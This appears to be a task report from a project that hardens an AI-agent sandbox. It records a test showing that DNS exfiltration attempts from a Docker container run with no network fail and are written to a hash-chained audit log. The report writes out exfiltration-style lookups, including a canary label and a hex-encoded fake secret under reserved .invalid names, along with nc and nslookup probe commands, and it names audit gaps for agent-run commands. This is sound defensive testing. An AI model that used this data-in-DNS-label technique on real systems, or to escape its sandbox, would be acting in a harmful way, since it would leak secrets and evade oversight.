# P7-T21 Break it: DNS exfiltration from the sandbox

Status: **done and seen locally on Docker** (Windows 11, Docker Desktop, server 29.5.3, 2026-11-03). Both criteria held: the lookup fails, and the attempt is in the audit log. The box is ticked. Not seen: gVisor, Firecracker, a Linux host, GitHub Actions (see the end).

Raw output: [`dns-exfil-local.txt`](../../packages/guard/results/dns-exfil-local.txt). The log it produced: [`dns-exfil-audit-local.jsonl`](../../packages/guard/results/dns-exfil-audit-local.jsonl) (14 records, head `96e1a549bdbe270826701480378cc87af5fb73ae99146217a83d7f8d9112fb5b`).

## Break it

- **Induced failure.** From inside the sandbox, resolve attacker-style names. The names are reserved test names (`.invalid` never resolves anywhere, RFC 2606); no real domain is queried:
  - `exfil.invalid`
  - `CANARY-NOT-A-SECRET.exfil.invalid` (a fake canary in the label, as exfiltration puts data in a label)
  - `67756172642d66616b652d7365637265742d6e6f742d7265616c.exfil.invalid` (the fake secret `guard-fake-secret-not-real`, hex-encoded)
- **Expected signal.** Resolution fails; the attempt is in the audit log.
- **Observed signal.** In the sandbox (the fix-loop flags: `--network none`, 1 CPU, 512 MB, pids limit):

  ```
  nslookup: can't connect to remote host (192.168.65.7): Network unreachable
  nslookup exit=1
  ```

  The probe `dns-exfil` of the escape suite does this for the three names and prints `PASS dns-exfil 3 lookups never reached a resolver`. The audit log has the record (kind `policy_event`, line 13, `seq` 12): `probe: dns-exfil`, `status: pass`, `queries: [exfil.invalid, CANARY-NOT-A-SECRET.exfil.invalid, 6775...7265616c.exfil.invalid]`. `guard verify-log` on the file: `OK 14 records, head 96e1a549...`. Changing the queried name in that record to another one: `BAD line 13: edited content (hash does not match the record)`, exit 1.
- **Fix.** No network namespace route at all, not just blocked ports. See the next section.

## What `--network none` gives (evidence seen)

With `--network none` Docker gives the container its own empty network namespace: no interface but loopback, and therefore no route. It is not a firewall that drops packets on port 53; there is nowhere for a packet to go. Seen inside the sandbox:

| Evidence | `--network none` (the sandbox) | Control: default bridge |
|---|---|---|
| `/proc/net/dev` | `lo` only | `lo`, `eth0` |
| `/proc/net/route` | header line only (no route) | default route and subnet route via `eth0` |
| `ip addr` | `lo` (127.0.0.1, ::1) | (not run) |
| `ip route` | empty | (not run) |
| `nslookup CANARY-NOT-A-SECRET.exfil.invalid` | `can't connect ... Network unreachable`, exit 1 | `Server: 192.168.65.7 ... server can't find CANARY-NOT-A-SECRET.exfil.invalid: NXDOMAIN`: the query left the box and a resolver answered |
| `nc 1.1.1.1 443` | exit 1 | (not run) |

Note the sandbox's `/etc/resolv.conf` still names a nameserver (`192.168.65.7`, copied from the Docker host). That does not matter: without an interface and a route, the packet cannot be sent. "Network unreachable" is the kernel saying so, not a reply from a server.

The control matters. NXDOMAIN is a **failure to resolve**, so a probe that only checked "did the name resolve" would pass in the control too. The probe therefore treats any resolver answer (an address, NXDOMAIN, `Server:` header) as ESCAPED and only a connection failure as BLOCKED. With the default bridge the same script prints `ESCAPED resolver answered for exfil.invalid` (test `test_positive_control_the_probe_fails_when_the_container_has_a_network`, passed; on a machine with no resolver it skips and says so).

## What was added

- `guard escape` has two new probes (suite is now 14): `dns-exfil` (the three names above; ESCAPED if any resolver answers, BLOCKED if none was reached, ERROR if `nslookup` is missing or the answer is unclear) and `no-net-route` (BLOCKED only if `/proc/net/dev` lists `lo` alone and `/proc/net/route` has no route; this is the standing check of the fix).
- Each audit record carries `queries`, the names the probe asked for (T17 wiring). `dns-lookup` records `example.com`.
- Tests (`packages/guard/tests/test_dns_exfil.py`, 5 tests; 3 need Docker and skip without it): the names are reserved, legal, and carry the canary and the hex-encoded fake secret; the name is in the audit record and the log verifies (stub launcher, no Docker); the real sandbox blocks and records; the control with a network makes both probes fail.

## Not verified

- Only the Docker tier on Docker Desktop (Windows, WSL2 backend). gVisor and Firecracker have their own network stacks and were not run. On a Linux host the evidence should be the same; it was not seen there.
- IPv6-only resolvers, DNS over HTTPS and other tunnels are not probed: they all need a route, which the sandbox does not have, but only DNS over UDP/TCP port 53 was tried.
- The record is written **after** the probe returns, with its outcome. It proves the attempt was made and what was asked, not that a packet was seen on the wire. A lookup made by something other than this probe (for example the agent running `nslookup` through `run_cmd`) is only in the log if the wrapper `audited()` is wired into the fix loop, which it is not yet (T06 note; outside T21).
